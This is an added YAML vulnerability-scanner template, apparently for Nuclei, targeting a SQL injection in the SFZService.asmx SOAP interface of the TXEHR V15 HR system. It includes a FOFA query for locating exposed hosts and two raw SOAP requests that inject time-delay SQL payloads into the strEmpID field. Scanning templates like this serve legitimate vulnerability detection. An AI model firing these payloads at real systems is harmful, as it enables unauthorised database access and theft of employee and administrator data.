@@ -1,0 +1,57 @@
+id: tongxiangHR-TXEHR-V15-SFZService_asmx-sql
+
+info:
+  name: "TXEHR V15 SFZService.asmx 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/Assistant/Default.aspx"
+      同享人力资源管理系统 TXEHR V15 版本的 SFZService.asmx Web服务接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句实现数据库敏感信息提取，包括但不限于管理员凭证及用户隐私数据。在具备DBA权限的场景下，攻击者可利用该漏洞执行系统命令，实现WebShell上传及服务器控制权获取。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486815&idx=1&sn=f0f94a18f1ba06fdb291fdafb2311678&chksm=c267b86cf510317ad3dacb85e241cefa41d197d9f75365b7ec553b5cb907ebe27874a85c46df&token=522460222&lang=zh_CN#rd
+  tags: 同享人力资源管理系统
+
+
+
+http:
+- raw:
+  - |
+    POST /Service/SFZService.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: "http://tempuri.org/GetJianLiByEmpID"
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+     <soap:Body>
+      <GetJianLiByEmpID xmlns="http://tempuri.org/">
+       <strEmpID>1';WAITFOR DELAY '0:0:4'--</strEmpID>
+      </GetJianLiByEmpID>
+     </soap:Body>
+    </soap:Envelope>
+  - |
+    POST /Service/SFZService.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: "http://tempuri.org/GetJianLiByEmpID"
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+     <soap:Body>
+      <GetJianLiByEmpID xmlns="http://tempuri.org/">
+       <strEmpID>1';WAITFOR DELAY '0:0:8'--</strEmpID>
+      </GetJianLiByEmpID>
+     </soap:Body>
+    </soap:Envelope>
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
